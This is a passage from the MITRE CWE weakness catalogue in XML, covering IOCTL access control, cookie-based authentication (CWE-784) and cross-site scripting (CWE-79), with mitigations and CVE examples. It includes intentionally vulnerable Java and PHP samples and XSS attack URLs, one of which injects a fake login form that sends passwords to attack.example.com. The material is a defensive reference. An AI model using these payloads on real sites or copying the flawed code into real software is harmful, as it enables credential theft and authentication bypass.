            <Related_Weakness Nature="CanPrecede" CWE_ID="781" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Often"/>
            <Language Name="C++" Prevalence="Often"/>
            <Operating_System Class="Unix" Prevalence="Undetermined"/>
            <Operating_System Class="Windows" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Confidentiality</Scope>
               <Note>Attackers can invoke any functionality that the IOCTL offers. Depending on the functionality, the consequences may include code execution, denial-of-service, and theft of data.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>In Windows environments, use proper access control for the associated device or device namespace. See References.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-2208</Reference>
               <Description>Operating system does not enforce permissions on an IOCTL that can be used to modify network settings.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2208</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3831</Reference>
               <Description>Device driver does not restrict ioctl calls to its master.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3831</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3525</Reference>
               <Description>ioctl does not check for a required capability before processing certain requests.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3525</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0322</Reference>
               <Description>Chain: insecure device permissions allows access to an IOCTL, allowing arbitrary memory to be overwritten.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0322</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4277</Reference>
               <Description>Chain: anti-virus product uses weak permissions for a device, leading to resultant buffer overflow in an exposed IOCTL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4277</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1400</Reference>
               <Description>Chain: sandbox allows opening of a TTY device, enabling shell commands through an exposed ioctl.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1400</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4926</Reference>
               <Description>Anti-virus product uses insecure security descriptor for a device driver, allowing access to a privileged IOCTL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4926</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0728</Reference>
               <Description>Unauthorized user can disable keyboard or mouse by directly invoking a privileged IOCTL.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0728</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-701"/>
         </References>
         <Notes>
            <Note Type="Relationship">This can be primary to many other weaknesses when the programmer assumes that the IOCTL can only be accessed by trusted parties. For example, a program or driver might not validate incoming addresses in METHOD_NEITHER IOCTLs in Windows environments (CWE-781), which could allow buffer overflow and similar attacks to take place, even when the attacker never should have been able to access the IOCTL at all.</Note>
            <Note Type="Applicable Platform">
               <xhtml:p>Because IOCTL functionality is typically performing low-level actions and closely interacts with the operating system, this weakness may only appear in code that is written in low-level languages.</xhtml:p>
            </Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="784" Name="Reliance on Cookies without Validation and Integrity Checking in a Security Decision" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The application uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user.</Description>
         <Extended_Description>Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Attackers can bypass protection mechanisms such as authorization and authentication by modifying the cookie to contain an expected value.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="807" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="565" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="565" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to claim a high level of authorization, or to claim that successful authentication has occurred.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid using cookie data for a security-related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Add integrity checks to detect tampering.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-15">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to determine the role of the user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:10px;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("role")) {<xhtml:div style="margin-left:10px;">userRole = c.getValue();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-16">
               <Intro_Text>The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$auth = $_COOKIES['authenticated'];<xhtml:br/>if (! $auth) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (AuthenticateUser($_POST['user'], $_POST['password']) == "success") {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>// save the cookie to send out in future responses</xhtml:i>
                                 <xhtml:br/>setcookie("authenticated", "1", time()+60*60*2);</xhtml:div>
                           </xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>
                     </xhtml:div>}<xhtml:br/>DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the AuthenticateUser() check will always be applied, and the "authenticated" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.</Body_Text>
               <Body_Text>However, the attacker can set the "authenticated" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-17">
               <Intro_Text>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:10px;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("authenticated") &amp;&amp; Boolean.TRUE.equals(c.getValue())) {<xhtml:div style="margin-left:10px;">authenticated = true;</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-1549</Reference>
               <Description>Attacker can bypass authentication by setting a cookie to a specific value.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1549</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1619</Reference>
               <Description>Attacker can bypass authentication and gain admin privileges by setting an "admin" cookie to 1.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1619</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0864</Reference>
               <Description>Content management system allows admin privileges by setting a "login" cookie to "OK."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5784</Reference>
               <Description>e-dating application allows admin privileges by setting the admin cookie to 1.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5784</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6291</Reference>
               <Description>Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to "admin."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6291</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-706"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 13, &#34;Sensitive Data in Cookies and Fields&#34; Page 435"/>
         </References>
         <Notes>
            <Note Type="Maintenance">A new parent might need to be defined for this entry. This entry is specific to cookies, which reflects the significant number of vulnerabilities being reported for cookie-based authentication in CVE during 2008 and 2009. However, other types of inputs - such as parameters or headers - could also be used for similar authentication or authorization. Similar issues (under the Research view) include CWE-247 and CWE-472.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" Abstraction="Base" Structure="Simple" Status="Usable">
         <Description>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
         <Extended_Description>
            <xhtml:p>Cross-site scripting (XSS) vulnerabilities occur when:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>1. Untrusted data enters a web application, typically from a web request.</xhtml:li>
               <xhtml:li>2. The web application dynamically generates a web page that contains this untrusted data.</xhtml:li>
               <xhtml:li>3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.</xhtml:li>
               <xhtml:li>4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.</xhtml:li>
               <xhtml:li>5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.</xhtml:li>
               <xhtml:li>6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.</xhtml:li>
            </xhtml:ul>
            <xhtml:p>There are three main kinds of XSS:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>
                  <xhtml:b>Type 1: Reflected XSS (or Non-Persistent)</xhtml:b> - 
         			The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</xhtml:li>
               <xhtml:li>
                  <xhtml:b>Type 2: Stored XSS (or Persistent)</xhtml:b> - 
               The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
            </xhtml:li>
               <xhtml:li>
                  <xhtml:b>Type 0: DOM-Based XSS</xhtml:b> - 
               In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.
            </xhtml:li>
            </xhtml:ul>
            <xhtml:p>Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="494" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="352" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Often"/>
            <Technology Name="Web Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <xhtml:div style="color:#32498D; font-weight:bold;">Same Origin Policy</xhtml:div>
               <xhtml:p>The same origin policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.</xhtml:p>
               <xhtml:div style="color:#32498D; font-weight:bold;">Domain</xhtml:div>
               <xhtml:p>The Domain of a website when referring to XSS is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.</xhtml:p>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XSS</Term>
               <Description>"XSS" is a common abbreviation for Cross-Site Scripting.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>HTML Injection</Term>
               <Description>"HTML injection" is used as a synonym of stored (Type 2) XSS.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>CSS</Term>
               <Description>In the early years after initial discovery of XSS, "CSS" was a commonly-used acronym.  However, this would cause confusion with "Cascading Style Sheets," so usage of this acronym has declined significantly.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.</Effectiveness_Notes>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</xhtml:p>
                  <xhtml:p>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</xhtml:p>
                  <xhtml:p>Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>HTML body</xhtml:li>
                        <xhtml:li>Element attributes (such as src="XYZ")</xhtml:li>
                        <xhtml:li>URIs</xhtml:li>
                        <xhtml:li>JavaScript sections</xhtml:li>
                        <xhtml:li>Cascading Style Sheets and style property</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
                  <xhtml:p>etc. Note that HTML Entity Encoding is only appropriate for the HTML body.</xhtml:p>
                  <xhtml:p>Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Phase>Implementation</Phase>
               <Description>With Struts, write all data from form beans with the bean's filter attribute set to true.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When dynamically constructing web pages, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("&lt;3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "&lt;" character, which would need to be escaped or otherwise handled. In this case, stripping the "&lt;" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
                  <xhtml:p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code displays a welcome message on a web page based on the HTTP GET username parameter. This example covers a Reflected XSS (Type 1) scenario.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$username = $_GET['username'];<xhtml:br/>echo '&lt;div class="header"&gt; Welcome, ' . $username . '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript"&gt;alert("You've been attacked!");&lt;/Script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This results in a harmless alert dialogue popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.</Body_Text>
               <Body_Text>More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword"&gt;Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post"&gt;Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>&lt;div class="header"&gt; Welcome, &lt;div id="stealPassword"&gt; Please Login:<xhtml:div style="margin-left:10px;">
                        <xhtml:br/>&lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;<xhtml:div style="margin-left:10px;">Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;</xhtml:div>&lt;/form&gt;</xhtml:div>
